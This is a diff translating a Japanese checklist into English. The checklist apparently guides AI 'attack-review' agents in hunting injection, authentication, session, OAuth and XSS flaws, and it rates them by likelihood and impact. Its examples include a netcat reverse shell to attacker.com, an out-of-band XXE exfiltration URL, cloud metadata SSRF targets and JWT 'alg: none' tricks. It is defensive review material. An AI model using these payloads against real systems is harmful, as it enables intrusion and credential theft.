@@ -1,12 +1,12 @@
 # Attack Criteria
 
-attack-review エージェントが参照する攻撃チェックリスト。各エージェントは担当セクションを読み込み、該当する攻撃ベクターを調査する。
-全チェックは**攻撃者の視点**で行う。「この防御は十分か？」ではなく「どうやって突破するか？」を問う。
+Attack checklist referenced by attack-review agents. Each agent reads its assigned section and investigates the corresponding attack vectors.
+All checks are performed from an **attacker's perspective**. The question is not "Is this defense sufficient?" but rather "How do I break through?"
 
 ## Risk Matrix
 
-すべての発見は Likelihood x Impact で評価する。
-**語彙の統一**: Likelihood / Impact / Risk Level はすべて `critical | high | medium | low` の 4 値で表現する（JSON 出力スキーマに合わせる）。
+All findings are assessed using Likelihood x Impact.
+**Vocabulary standardization**: Likelihood / Impact / Risk Level all use the 4-value scale `critical | high | medium | low` (aligned with the JSON output schema).
 
 | | Impact: Low | Impact: Medium | Impact: High | Impact: Critical |
 |---|---|---|---|---|
@@ -15,12 +15,12 @@ attack-review エージェントが参照する攻撃チェックリスト。各
 | **Likelihood: Medium**   | Low    | Medium | High     | High |
 | **Likelihood: Low**      | Low    | Low    | Medium   | High |
 
-- **Likelihood**: 攻撃の発見容易性 + 悪用容易性（ツールで自動化可能か、認証不要か、公開情報から推測可能か）
+- **Likelihood**: Discoverability + exploitability of the attack (can it be automated with tools, does it require authentication, can it be inferred from public information)
   - `critical`: trivially exploitable, automated tools detect it, no authentication needed
   - `high`: exploitable with moderate effort, publicly known technique
   - `medium`: requires specific conditions or insider knowledge
   - `low`: theoretical, requires significant effort or unusual conditions
-- **Impact**: 被害の深刻度（RCE、データ漏洩、権限昇格、サービス停止、金銭的損失）
+- **Impact**: Severity of damage (RCE, data breach, privilege escalation, service disruption, financial loss)
   - `critical`: full system compromise, mass data breach, RCE
   - `high`: significant data leak, privilege escalation, account takeover
   - `medium`: limited data exposure, service disruption, single-user impact
@@ -28,109 +28,109 @@ attack-review エージェントが参照する攻撃チェックリスト。各
 
 ---
 
-## Agent 1: Injection Hunter — インジェクション攻撃専門 (server)
+## Agent 1: Injection Hunter — Injection Attack Specialist (server)
 
-サーバーサイドで外部入力が内部コマンド・クエリ・テンプレートに到達する経路を追跡し、注入可能なポイントを特定する。
+Traces paths where external input reaches internal commands, queries, or templates on the server side, and identifies injectable points.
 
 ### Check Items
 
 #### 1-1. SQL Injection (SQLi)
 
-- **WHAT**: ユーザー入力が SQL 文に文字列結合で埋め込まれている箇所
-- **WHERE**: ORM の `raw()` / `execute()` / `query()` 呼び出し、SQL テンプレートリテラル、ストアドプロシージャ呼び出し
-- **HOW TO EXPLOIT**: `' OR 1=1 --`, UNION-based extraction, blind SQLi (time-based / boolean-based), second-order SQLi (保存された値が後続クエリで注入される)
-- **WHY DANGEROUS**: DB 全データの抽出・改竄・削除、認証バイパス、場合によっては OS コマンド実行 (`xp_cmdshell`, `LOAD_FILE`)
+- **WHAT**: Locations where user input is embedded into SQL statements via string concatenation
+- **WHERE**: ORM `raw()` / `execute()` / `query()` calls, SQL template literals, stored procedure invocations
+- **HOW TO EXPLOIT**: `' OR 1=1 --`, UNION-based extraction, blind SQLi (time-based / boolean-based), second-order SQLi (stored values injected into subsequent queries)
+- **WHY DANGEROUS**: Extraction, modification, or deletion of all DB data; authentication bypass; in some cases OS command execution (`xp_cmdshell`, `LOAD_FILE`)
 - **SEVERITY**:
-  - Critical: パラメータ化されていない動的 SQL でユーザー入力が直接到達する
-  - High: ORM の raw クエリで部分的にエスケープされているが回避可能
-  - Medium: ストアドプロシージャ経由で間接的に到達する
-  - Low: 入力に型制約があり注入が困難（整数のみ等）
+  - Critical: Unparameterized dynamic SQL where user input directly reaches the query
+  - High: ORM raw queries with partial escaping that can be bypassed
+  - Medium: Indirect access via stored procedures
+  - Low: Input has type constraints making injection difficult (integers only, etc.)
 
 #### 1-2. Command Injection / OS Command Injection
 
-- **WHAT**: ユーザー入力がシェルコマンドに渡される箇所
+- **WHAT**: Locations where user input is passed to shell commands
 - **WHERE**: `child_process.exec()`, `os.system()`, `subprocess.Popen(shell=True)`, backtick execution, `Runtime.exec()`, `system()`, `popen()`
 - **HOW TO EXPLOIT**: `; cat /etc/passwd`, `$(whoami)`, `| nc attacker.com 4444 -e /bin/sh`, newline injection, argument injection (`--output=/etc/cron.d/backdoor`)
-- **WHY DANGEROUS**: Remote Code Execution (RCE)。サーバー完全掌握の直接経路
+- **WHY DANGEROUS**: Remote Code Execution (RCE). A direct path to full server compromise
 - **SEVERITY**:
-  - Critical: `exec()` / `system()` にユーザー入力が到達し、サニタイズなし
-  - High: 入力は部分的にフィルタされているが、代替文字 (`\n`, `\x00`, Unicode normalization) で回避可能
-  - Medium: 引数インジェクション（コマンド自体は固定だがフラグを操作可能）
-  - Low: ホワイトリスト検証あり、ただし不完全な可能性
+  - Critical: User input reaches `exec()` / `system()` with no sanitization
+  - High: Input is partially filtered but can be bypassed via alternative characters (`\n`, `\x00`, Unicode normalization)
+  - Medium: Argument injection (command itself is fixed but flags can be manipulated)
+  - Low: Whitelist validation exists but may be incomplete
 
 #### 1-3. Server-Side Request Forgery (SSRF)
 
-- **WHAT**: ユーザーが指定した URL / ホスト名をサーバーが取得する箇所
-- **WHERE**: HTTP クライアント呼び出し (`fetch`, `requests.get`, `HttpClient`), URL パラメータ, Webhook URL 設定, ファイルインポート（URL 指定）
-- **HOW TO EXPLOIT**: `http://169.254.169.254/latest/meta-data/` (クラウドメタデータ), `http://localhost:6379/` (内部サービス), `file:///etc/passwd`, DNS rebinding, URL パーサーの差異を利用したバイパス (`http://evil.com@localhost/`)
-- **WHY DANGEROUS**: クラウド認証情報の窃取 (IAM role credentials)、内部ネットワークのスキャン・攻撃、ファイル読み取り
+- **WHAT**: Locations where the server fetches a URL / hostname specified by the user
+- **WHERE**: HTTP client calls (`fetch`, `requests.get`, `HttpClient`), URL parameters, webhook URL settings, file import (URL-based)
+- **HOW TO EXPLOIT**: `http://169.254.169.254/latest/meta-data/` (cloud metadata), `http://localhost:6379/` (internal services), `file:///etc/passwd`, DNS rebinding, URL parser differential bypass (`http://evil.com@localhost/`)
+- **WHY DANGEROUS**: Theft of cloud credentials (IAM role credentials), scanning/attacking internal networks, file read access
 - **SEVERITY**:
-  - Critical: URL がユーザー入力から直接構築され、allowlist なし、クラウド環境
-  - High: URL バリデーションあるが DNS rebinding / URL パーサー差異で回避可能
-  - Medium: プロトコル制限 (http/https のみ) はあるが内部 IP への到達が可能
-  - Low: allowlist あり、ただし正規表現が不完全
+  - Critical: URL constructed directly from user input with no allowlist, in a cloud environment
+  - High: URL validation exists but bypassable via DNS rebinding / URL parser differentials
+  - Medium: Protocol restriction (http/https only) exists but internal IP addresses are reachable
+  - Low: Allowlist exists but regex is incomplete
 
 #### 1-4. Path Traversal / Local File Inclusion (LFI)
 
-- **WHAT**: ユーザー入力がファイルパスに使われる箇所
-- **WHERE**: `fs.readFile()`, `open()`, `include()`, ファイルアップロードの保存先パス、テンプレートファイルの動的選択
-- **HOW TO EXPLOIT**: `../../../etc/passwd`, `....//....//etc/passwd` (フィルタバイパス), `%2e%2e%2f` (URL エンコーディング), null byte injection (`%00`), Windows UNC パス (`\\attacker\share`)
-- **WHY DANGEROUS**: ソースコード漏洩、設定ファイル (`.env`, `config.json`) の読み取り、LFI → RCE (ログファイルへの注入 + include)
+- **WHAT**: Locations where user input is used in file paths
+- **WHERE**: `fs.readFile()`, `open()`, `include()`, upload destination paths, dynamic template file selection
+- **HOW TO EXPLOIT**: `../../../etc/passwd`, `....//....//etc/passwd` (filter bypass), `%2e%2e%2f` (URL encoding), null byte injection (`%00`), Windows UNC paths (`\\attacker\share`)
+- **WHY DANGEROUS**: Source code leakage, reading configuration files (`.env`, `config.json`), LFI → RCE (injection into log files + include)
 - **SEVERITY**:
-  - Critical: ファイルパスにユーザー入力が直接使われ、`../` フィルタなし
-  - High: フィルタあるが正規化前にチェックしている（二重エンコーディングで回避可能）
-  - Medium: chroot / ベースパス制限あるが、シンボリックリンク経由で脱出可能
-  - Low: ホワイトリスト方式だが、リストの管理が不完全
+  - Critical: User input is used directly in file paths with no `../` filtering
+  - High: Filter exists but checks before normalization (bypassable via double encoding)
+  - Medium: Chroot / base path restriction exists but escapable via symlinks
+  - Low: Whitelist-based approach but list management is incomplete
 
 #### 1-5. Server-Side Template Injection (SSTI)
 
-- **WHAT**: ユーザー入力がテンプレートエンジンに渡される箇所
-- **WHERE**: Jinja2 `render_template_string()`, Twig, Freemarker, Velocity, ERB, Pug/Jade の動的テンプレート生成
-- **HOW TO EXPLOIT**: `{{7*7}}` → `49` で検出、`{{config.items()}}` (Jinja2), `${Runtime.getRuntime().exec("id")}` (Freemarker), `#{system("id")}` (ERB)
-- **WHY DANGEROUS**: RCE。テンプレートエンジンのサンドボックス脱出でサーバー完全掌握
+- **WHAT**: Locations where user input is passed to template engines
+- **WHERE**: Jinja2 `render_template_string()`, Twig, Freemarker, Velocity, ERB, Pug/Jade dynamic template generation
+- **HOW TO EXPLOIT**: `{{7*7}}` → `49` for detection, `{{config.items()}}` (Jinja2), `${Runtime.getRuntime().exec("id")}` (Freemarker), `#{system("id")}` (ERB)
+- **WHY DANGEROUS**: RCE. Full server compromise via template engine sandbox escape
 - **SEVERITY**:
-  - Critical: `render_template_string(user_input)` のように入力がテンプレートとして解釈される
-  - High: テンプレートの一部（変数名、フィルタ名）にユーザー入力が到達する
-  - Medium: サンドボックスモードが有効だが、既知の脱出テクニックが存在するバージョン
-  - Low: テンプレート文字列は固定で、データのみがユーザー入力
+  - Critical: Input is interpreted as a template, e.g., `render_template_string(user_input)`
+  - High: User input reaches part of the template (variable names, filter names)
+  - Medium: Sandbox mode is enabled but known escape techniques exist for the current version
+  - Low: Template string is fixed; only data is user input
 
 #### 1-6. XML External Entity (XXE)
 
-- **WHAT**: XML パーサーが外部エンティティを解決する設定になっている箇所
-- **WHERE**: XML パーサー (`DocumentBuilder`, `SAXParser`, `lxml.etree`, `xml.etree`), SOAP エンドポイント, SVG アップロード, XLSX/DOCX 処理
-- **HOW TO EXPLOIT**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, OOB-XXE (`<!ENTITY xxe SYSTEM "http://attacker.com/?data=...">`)、Billion Laughs DoS
-- **WHY DANGEROUS**: ファイル読み取り、SSRF、DoS
+- **WHAT**: Locations where the XML parser is configured to resolve external entities
+- **WHERE**: XML parsers (`DocumentBuilder`, `SAXParser`, `lxml.etree`, `xml.etree`), SOAP endpoints, SVG uploads, XLSX/DOCX processing
+- **HOW TO EXPLOIT**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, OOB-XXE (`<!ENTITY xxe SYSTEM "http://attacker.com/?data=...">`), Billion Laughs DoS
+- **WHY DANGEROUS**: File read access, SSRF, DoS
 - **SEVERITY**:
-  - Critical: 外部エンティティが有効な XML パーサーでユーザー XML を処理
-  - High: DTD 処理が有効（パラメータエンティティ経由での攻撃が可能）
-  - Medium: パーサーは制限されているが SVG / Office ファイル経由で XML が到達
-  - Low: XML パーサーの設定は安全だが、文書化されていない
+  - Critical: XML parser with external entities enabled processes user-supplied XML
+  - High: DTD processing is enabled (attacks possible via parameter entities)
+  - Medium: Parser is restricted but XML arrives via SVG / Office files
+  - Low: XML parser configuration is secure but not documented
 
 #### 1-7. LDAP Injection
 
-- **WHAT**: ユーザー入力が LDAP クエリに文字列結合で埋め込まれる箇所
-- **WHERE**: LDAP 認証、ディレクトリ検索、Active Directory 連携
-- **HOW TO EXPLOIT**: `*)(uid=*))(|(uid=*` で全ユーザー列挙、`*)(userPassword=*)` で属性抽出
-- **WHY DANGEROUS**: 認証バイパス、ディレクトリ情報の不正取得
+- **WHAT**: Locations where user input is embedded into LDAP queries via string concatenation
+- **WHERE**: LDAP authentication, directory searches, Active Directory integration
+- **HOW TO EXPLOIT**: `*)(uid=*))(|(uid=*` to enumerate all users, `*)(userPassword=*)` for attribute extraction
+- **WHY DANGEROUS**: Authentication bypass, unauthorized directory information retrieval
 - **SEVERITY**:
-  - Critical: LDAP フィルタにユーザー入力が直接結合され、エスケープなし
-  - High: 部分的なエスケープがあるが特殊文字の処理が不完全
-  - Medium: LDAP ライブラリのパラメータ化 API を使っているが一部手動構築
-  - Low: 読み取り専用 LDAP バインドで影響が限定的
+  - Critical: User input is directly concatenated into LDAP filters with no escaping
+  - High: Partial escaping exists but special character handling is incomplete
+  - Medium: LDAP library's parameterized API is used but some queries are manually constructed
+  - Low: Read-only LDAP bind limits the impact
 
 #### 1-8. Header Injection / HTTP Response Splitting
 
-- **WHAT**: ユーザー入力が HTTP ヘッダーに反映される箇所
-- **WHERE**: `Location` ヘッダー (リダイレクト)、`Set-Cookie`、カスタムヘッダー、メール送信の `To` / `Subject`
-- **HOW TO EXPLOIT**: `\r\n` で改行を注入し、任意のヘッダーを追加、レスポンスボディを注入 (HTTP Response Splitting)、メールヘッダーインジェクション (`\nBcc: attacker@evil.com`)
-- **WHY DANGEROUS**: XSS (レスポンスボディ注入)、キャッシュポイズニング、セッション固定、スパムメール送信
+- **WHAT**: Locations where user input is reflected in HTTP headers
+- **WHERE**: `Location` header (redirects), `Set-Cookie`, custom headers, email `To` / `Subject` fields
+- **HOW TO EXPLOIT**: Inject `\r\n` to add arbitrary headers, inject response body (HTTP Response Splitting), email header injection (`\nBcc: attacker@evil.com`)
+- **WHY DANGEROUS**: XSS (via response body injection), cache poisoning, session fixation, spam email delivery
 - **SEVERITY**:
-  - Critical: `\r\n` がフィルタされずヘッダーに到達する
-  - High: 一部のフレームワークが CRLF を除去するが、古いバージョンでは不完全
-  - Medium: ヘッダー値はエンコードされるが、特定のプロキシ構成で問題が発生
-  - Low: モダンフレームワークが自動的にサニタイズするが、カスタムヘッダー処理は未検証
+  - Critical: `\r\n` reaches the header unfiltered
+  - High: Some frameworks strip CRLF but older versions do so incompletely
+  - Medium: Header values are encoded but issues arise under specific proxy configurations
+  - Low: Modern frameworks auto-sanitize but custom header processing is unverified
 
-### Language-Agnostic Patterns (共通パターン)
+### Language-Agnostic Patterns
 
 An attacker would look for these universal anti-patterns regardless of language:
 
@@ -161,288 +161,288 @@ Template(user_input).render()
 
 ---
 
-## Agent 2: AuthN/AuthZ Breaker — 認証・認可突破専門 (both)
+## Agent 2: AuthN/AuthZ Breaker — Authentication & Authorization Bypass Specialist (both)
 
-認証をバイパスし、他人のリソースにアクセスし、権限を昇格する経路を探す。
+Finds paths to bypass authentication, access other users' resources, and escalate privileges.
 
 ### Check Items
 
 #### 2-1. Authentication Bypass
 
-- **WHAT**: 認証チェックを迂回できる経路
-- **WHERE**: 認証ミドルウェア / ガード、ログインエンドポイント、パスワードリセットフロー、API 認証、OAuth/OIDC 実装
+- **WHAT**: Paths that circumvent authentication checks
+- **WHERE**: Authentication middleware / guards, login endpoints, password reset flows, API authentication, OAuth/OIDC implementations
 - **HOW TO EXPLOIT**:
-  - ルートの認証ミドルウェア適用漏れ（新規エンドポイントに `@login_required` がない）
-  - HTTP メソッド切り替え（`GET` は認証必須だが `POST` / `PUT` は未保護）
-  - パスの正規化差異（`/admin` は保護だが `/admin/` や `/Admin` や `/%61dmin` は未保護）
-  - デフォルト / テスト用クレデンシャル（`admin:admin`, `test:test`）の残存
-  - パスワードリセットトークンの予測可能性（タイムスタンプベース、短いトークン）
-  - レート制限なしのブルートフォース
-- **WHY DANGEROUS**: 任意のアカウントへの不正アクセス、管理者権限の奪取
+  - Missing authentication middleware on routes (new endpoint lacks `@login_required`)
+  - HTTP method switching (`GET` requires auth but `POST` / `PUT` are unprotected)
+  - Path normalization differences (`/admin` is protected but `/admin/` or `/Admin` or `/%61dmin` is not)
+  - Residual default / test credentials (`admin:admin`, `test:test`)
+  - Predictable password reset tokens (timestamp-based, short tokens)
+  - Brute force without rate limiting
+- **WHY DANGEROUS**: Unauthorized access to arbitrary accounts, admin privilege takeover
 - **SEVERITY**:
-  - Critical: 認証なしで管理者エンドポイントにアクセス可能
-  - High: パスワードリセットトークンが予測可能、レート制限なしのログイン
-  - Medium: テスト用クレデンシャルの残存、ロックアウト機構の不在
-  - Low: パスワードポリシーが弱い（最小文字数のみ）
+  - Critical: Admin endpoints accessible without authentication
+  - High: Predictable password reset tokens, login without rate limiting
+  - Medium: Residual test credentials, absence of lockout mechanism
+  - Low: Weak password policy (minimum length only)
 
 #### 2-2. Insecure Direct Object Reference (IDOR)
 
-- **WHAT**: リソースアクセス時に所有権チェックが欠如している箇所
-- **WHERE**: `/api/users/{id}`, `/api/orders/{orderId}`, `/api/documents/{docId}`, ファイルダウンロードエンドポイント
+- **WHAT**: Locations where ownership checks are missing during resource access
+- **WHERE**: `/api/users/{id}`, `/api/orders/{orderId}`, `/api/documents/{docId}`, file download endpoints
 - **HOW TO EXPLOIT**:
-  - ID をインクリメント (`/api/users/1001` → `/api/users/1002`)
-  - UUID であっても、レスポンス内の他ユーザーの UUID をリーク箇所から収集
-  - GraphQL の `node(id: "...")` クエリで任意ノードへアクセス
-  - バッチ API で他人の ID を混入 (`[1001, 1002, 9999]`)
-- **WHY DANGEROUS**: 他ユーザーのデータ閲覧・変更・削除
+  - Increment IDs (`/api/users/1001` → `/api/users/1002`)
+  - Even with UUIDs, collect other users' UUIDs from leak points in responses
+  - GraphQL `node(id: "...")` queries to access arbitrary nodes
+  - Inject other users' IDs in batch APIs (`[1001, 1002, 9999]`)
+- **WHY DANGEROUS**: Viewing, modifying, or deleting other users' data
 - **SEVERITY**:
-  - Critical: 連番 ID + 所有権チェックなし + 機密データ（個人情報、決済情報）
-  - High: UUID だが所有権チェックなし + 機密データ
-  - Medium: 所有権チェックあるが特定の API パス（一覧 / エクスポート）で漏れ
-  - Low: 公開データのみ、ただし列挙可能
+  - Critical: Sequential IDs + no ownership check + sensitive data (PII, payment info)
+  - High: UUIDs but no ownership check + sensitive data
+  - Medium: Ownership check exists but is missing on specific API paths (listing / export)
+  - Low: Only public data, but enumerable
 
 #### 2-3. Privilege Escalation
 
-- **WHAT**: 低権限ユーザーが高権限操作を実行できる経路
-- **WHERE**: ロール / 権限チェックロジック、管理者 API、ユーザープロフィール更新
+- **WHAT**: Paths where low-privilege users can execute high-privilege operations
+- **WHERE**: Role / permission check logic, admin APIs, user profile updates
 - **HOW TO EXPLOIT**:
-  - リクエストボディで `role: "admin"` を送信（mass assignment）
-  - フロントエンドで非表示にしているだけの管理者 API を直接呼び出す
-  - 権限チェックがフロントエンドのみ（バックエンドは無検証）
-  - トークンの `role` クレームをクライアント側で改竄
-  - パス操作で別テナントのリソースにアクセス
-- **WHY DANGEROUS**: 管理者権限の奪取、テナント間データ漏洩
+  - Send `role: "admin"` in request body (mass assignment)
+  - Directly call admin APIs that are only hidden on the frontend
+  - Authorization checks only on the frontend (backend does not validate)
+  - Tamper with the `role` claim in tokens on the client side
+  - Access resources of another tenant via path manipulation
+- **WHY DANGEROUS**: Admin privilege takeover, cross-tenant data leakage
 - **SEVERITY**:
-  - Critical: 一般ユーザーが管理者 API を実行可能（バックエンド検証なし）
-  - High: ロールチェックはあるがバイパス可能（例: 条件分岐の論理エラー）
-  - Medium: 水平権限昇格（同レベルの他ユーザーのリソース操作）
-  - Low: 権限昇格の影響が限定的（表示のみの管理画面等）
+  - Critical: Regular users can execute admin APIs (no backend validation)
+  - High: Role check exists but is bypassable (e.g., logic error in conditional branching)
+  - Medium: Horizontal privilege escalation (operating on resources of other users at the same level)
+  - Low: Impact of privilege escalation is limited (view-only admin screens, etc.)
 
 #### 2-4. JWT Weaknesses
 
-- **WHAT**: JWT の生成・検証における脆弱性
-- **WHERE**: JWT ライブラリの使用箇所、トークン生成・検証ロジック、ミドルウェア
+- **WHAT**: Vulnerabilities in JWT generation and verification
+- **WHERE**: JWT library usage, token generation / verification logic, middleware
 - **HOW TO EXPLOIT**:
-  - **Algorithm confusion**: `alg: "none"` で署名検証をスキップ、`HS256` と `RS256` の混同（公開鍵を HMAC シークレットとして使用）
-  - **Secret brute force**: 短い / 辞書攻撃可能なシークレット (`secret`, `password123`)
-  - **Missing expiry**: `exp` クレームなし → トークンが永続的に有効
-  - **Missing audience/issuer validation**: 別サービスのトークンを流用
-  - **Kid injection**: `kid` ヘッダーに SQLi / Path Traversal を注入
-  - **JWK injection**: `jwk` / `jku` ヘッダーで攻撃者の公開鍵を指定
-- **WHY DANGEROUS**: 任意ユーザーへのなりすまし、永続的なセッションハイジャック
+  - **Algorithm confusion**: `alg: "none"` to skip signature verification, `HS256` / `RS256` confusion (using the public key as the HMAC secret)
+  - **Secret brute force**: Short / dictionary-attackable secrets (`secret`, `password123`)
+  - **Missing expiry**: No `exp` claim → token is valid indefinitely
+  - **Missing audience/issuer validation**: Reuse tokens from a different service
+  - **Kid injection**: Inject SQLi / Path Traversal into the `kid` header
+  - **JWK injection**: Specify the attacker's public key via `jwk` / `jku` headers
+- **WHY DANGEROUS**: Impersonation of arbitrary users, persistent session hijacking
 - **SEVERITY**:
-  - Critical: `alg: "none"` を受け入れる、シークレットが推測可能
-  - High: `exp` なし、audience 未検証、`kid` インジェクション可能
-  - Medium: トークンの有効期間が過度に長い（24h+）、リフレッシュトークンの回転なし
-  - Low: JWT ライブラリのバージョンが古い（既知の脆弱性の可能性）
+  - Critical: Accepts `alg: "none"`, secret is guessable
+  - High: No `exp`, audience not validated, `kid` injection possible
+  - Medium: Excessively long token lifetime (24h+), no refresh token rotation
+  - Low: JWT library version is outdated (potential known vulnerabilities)
 
 #### 2-5. Session Management Flaws
 
-- **WHAT**: セッション管理の不備
-- **WHERE**: セッション生成、Cookie 設定、ログアウト処理、パスワード変更処理
+- **WHAT**: Deficiencies in session management
+- **WHERE**: Session generation, cookie settings, logout handling, password change handling
 - **HOW TO EXPLOIT**:
-  - **Session fixation**: ログイン前後でセッション ID が変わらない → 攻撃者が事前にセッション ID をセット
-  - **Weak session ID generation**: 予測可能な乱数生成器（`Math.random()`, タイムスタンプベース）
-  - **Missing invalidation**: ログアウト後もセッションがサーバー側で有効、パスワード変更後も既存セッションが継続
-  - **Concurrent sessions**: セッション数の上限なし → 窃取されたセッションの検知困難
-- **WHY DANGEROUS**: セッションハイジャック、アカウント乗っ取りの永続化
+  - **Session fixation**: Session ID does not change before and after login → attacker pre-sets the session ID
+  - **Weak session ID generation**: Predictable RNG (`Math.random()`, timestamp-based)
+  - **Missing invalidation**: Session remains valid server-side after logout, existing sessions continue after password change
+  - **Concurrent sessions**: No limit on session count → difficult to detect stolen sessions
+- **WHY DANGEROUS**: Session hijacking, persistent account takeover
 - **SEVERITY**:
-  - Critical: セッション固定 + ログイン前後で ID 不変
-  - High: ログアウトでサーバー側セッションが破棄されない
-  - Medium: パスワード変更後に既存セッションが無効化されない
-  - Low: セッションタイムアウトが過度に長い
+  - Critical: Session fixation + ID unchanged across login
+  - High: Server-side session not destroyed on logout
+  - Medium: Existing sessions not invalidated on password change
+  - Low: Excessively long session timeout
 
 #### 2-6. OAuth / OpenID Connect Misconfiguration
 
-- **WHAT**: OAuth フローの実装不備
-- **WHERE**: OAuth 認可エンドポイント、コールバック URL、トークン交換
+- **WHAT**: Implementation flaws in OAuth flows
+- **WHERE**: OAuth authorization endpoints, callback URLs, token exchange
 - **HOW TO EXPLOIT**:
-  - **Open redirect via redirect_uri**: `redirect_uri=https://attacker.com` でアクセストークンを窃取
-  - **Missing state parameter**: CSRF で被害者のアカウントに攻撃者の OAuth アカウントを紐付け
-  - **Authorization code replay**: 使用済みコードの再利用
-  - **Scope escalation**: 追加スコープを要求して過剰な権限を取得
-  - **PKCE なしの public client**: Authorization code interception
-- **WHY DANGEROUS**: アカウント乗っ取り、アクセストークンの窃取
+  - **Open redirect via redirect_uri**: `redirect_uri=https://attacker.com` to steal access tokens
+  - **Missing state parameter**: CSRF to link the attacker's OAuth account to the victim's account
+  - **Authorization code replay**: Reuse of spent codes
+  - **Scope escalation**: Request additional scopes to gain excessive permissions
+  - **Public client without PKCE**: Authorization code interception
+- **WHY DANGEROUS**: Account takeover, access token theft
 - **SEVERITY**:
-  - Critical: `redirect_uri` の検証なし（任意ドメインへリダイレクト可能）
-  - High: `state` パラメータなし、PKCE なしの SPA
-  - Medium: `redirect_uri` がサブドメインレベルでのみ検証（オープンリダイレクトとの組み合わせ）
-  - Low: スコープの過剰付与（実使用より広い権限）
+  - Critical: No `redirect_uri` validation (redirect to arbitrary domains possible)
+  - High: No `state` parameter, SPA without PKCE
+  - Medium: `redirect_uri` validated at subdomain level only (combinable with open redirect)
+  - Low: Excessive scope grants (broader permissions than actually used)
 
 #### 2-7. Cookie Security
 
-- **WHAT**: Cookie のセキュリティ属性の不備
-- **WHERE**: `Set-Cookie` ヘッダー、セッション Cookie、認証トークン Cookie
+- **WHAT**: Missing security attributes on cookies
+- **WHERE**: `Set-Cookie` headers, session cookies, authentication token cookies
 - **HOW TO EXPLOIT**:
-  - `HttpOnly` なし → XSS で `document.cookie` 経由でセッション窃取
-  - `Secure` なし → HTTP 通信で Cookie が平文送信（MITM で窃取）
-  - `SameSite=None` + `Secure` なし → CSRF に脆弱
-  - Cookie の `Path` / `Domain` が過度に広い → サブドメインの脆弱なアプリ経由で窃取
-- **WHY DANGEROUS**: セッションハイジャック、CSRF
+  - No `HttpOnly` → session theft via `document.cookie` through XSS
+  - No `Secure` → cookie sent in plaintext over HTTP (MITM theft)
+  - `SameSite=None` + no `Secure` → vulnerable to CSRF
+  - Overly broad cookie `Path` / `Domain` → theft via a vulnerable app on a subdomain
+- **WHY DANGEROUS**: Session hijacking, CSRF
 - **SEVERITY**:
-  - Critical: セッション Cookie に `HttpOnly` なし + XSS が存在
-  - High: `Secure` フラグなし（本番環境で HTTP が有効）
-  - Medium: `SameSite` 未設定（ブラウザデフォルトに依存）
-  - Low: `Domain` 属性が過度に広い
+  - Critical: Session cookie without `HttpOnly` + XSS exists
+  - High: No `Secure` flag (HTTP enabled in production)
+  - Medium: `SameSite` not set (relies on browser defaults)
+  - Low: `Domain` attribute is overly broad
 
 ---
 
-## Agent 3: Client Attack Specialist — クライアントサイド攻撃専門 (client)
+## Agent 3: Client Attack Specialist — Client-Side Attack Specialist (client)
 
-ブラウザ / クライアント環境で動作する攻撃ベクターを網羅的に調査する。
+Comprehensively investigates attack vectors operating in browser / client environments.
 
 ### Check Items
 
 #### 3-1. Cross-Site Scripting (XSS)
 
-- **WHAT**: ユーザー入力がサニタイズなしで HTML / JavaScript コンテキストに出力される箇所
-- **WHERE**: テンプレートレンダリング、API レスポンスの DOM 挿入、エラーメッセージ表示
+- **WHAT**: Locations where user input is output into HTML / JavaScript contexts without sanitization
+- **WHERE**: Template rendering, DOM insertion of API responses, error message display
 
 ##### 3-1a. Reflected XSS
 
-- **HOW TO EXPLOIT**: URL パラメータ / フォーム入力が直接 HTML に反映 (`<script>alert(1)</script>`, `" onmouseover="alert(1)`, `javascript:alert(1)`)
+- **HOW TO EXPLOIT**: URL parameters / form inputs reflected directly in HTML (`<script>alert(1)</script>`, `" onmouseover="alert(1)`, `javascript:alert(1)`)
 - **SEVERITY**:
-  - Critical: WAF なし + Cookie に HttpOnly なし → セッションハイジャックの完全経路
-  - High: 出力箇所が HTML 属性内 / JavaScript コンテキスト内
-  - Medium: CSP が存在するが `unsafe-inline` 許可
-  - Low: self-XSS のみ（他ユーザーに影響を与える配信経路がない）
+  - Critical: No WAF + no HttpOnly on cookies → complete session hijacking path
+  - High: Output location is within HTML attributes / JavaScript contexts
+  - Medium: CSP exists but allows `unsafe-inline`
+  - Low: Self-XSS only (no delivery path to affect other users)
 
 ##### 3-1b. Stored XSS
 
-- **HOW TO EXPLOIT**: コメント、プロフィール、ファイル名などに永続的にスクリプトを保存。閲覧した全ユーザーに発火
+- **HOW TO EXPLOIT**: Persistently store scripts in comments, profiles, filenames, etc. Fires for all users who view the content
 - **SEVERITY**:
-  - Critical: 管理者が閲覧する画面で発火 → 管理者権限の奪取
-  - High: 一般ユーザー間で伝播（コメント、メッセージ）
-  - Medium: 限定的なコンテキストでのみ発火（特定画面のみ）
-  - Low: マークダウンレンダラーの不備だが CSP で実行が阻止される
+  - Critical: Fires on screens viewed by admins → admin privilege takeover
+  - High: Propagates between regular users (comments, messages)
+  - Medium: Fires only in limited contexts (specific screens only)
+  - Low: Markdown renderer flaw but CSP blocks execution
 
 ##### 3-1c. DOM-based XSS
 
-- **WHAT**: クライアントサイド JavaScript が DOM を操作する際に発生する XSS
-- **SOURCES** (攻撃者が制御可能な入力):
+- **WHAT**: XSS that occurs when client-side JavaScript manipulates the DOM
+- **SOURCES** (attacker-controllable inputs):
   - `location.hash`, `location.search`, `location.href`
   - `document.referrer`
   - `window.name`
-  - `postMessage` のデータ
-  - `localStorage` / `sessionStorage` の値
+  - `postMessage` data
+  - `localStorage` / `sessionStorage` values
   - `document.cookie`
-- **SINKS** (危険な出力先):
+- **SINKS** (dangerous output destinations):
   - `innerHTML`, `outerHTML`, `insertAdjacentHTML`
   - `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
   - `document.write()`, `document.writeln()`
-  - `element.src`, `element.href` (特に `javascript:` プロトコル)
+  - `element.src`, `element.href` (especially with `javascript:` protocol)
   - `jQuery.html()`, `$.append()`, `v-html`, `dangerouslySetInnerHTML`
-- **HOW TO EXPLOIT**: Source から Sink への追跡。フレームワークの安全なバインディング (`{{}}`, `{}`) をバイパスする `v-html`, `dangerouslySetInnerHTML` の誤用
+- **HOW TO EXPLOIT**: Trace from source to sink. Misuse of `v-html`, `dangerouslySetInnerHTML` that bypass frameworks' safe bindings (`{{}}`, `{}`)
 - **SEVERITY**:
-  - Critical: `eval(location.hash.slice(1))` のような直接経路
-  - High: `innerHTML = data` で `data` がユーザー制御可能
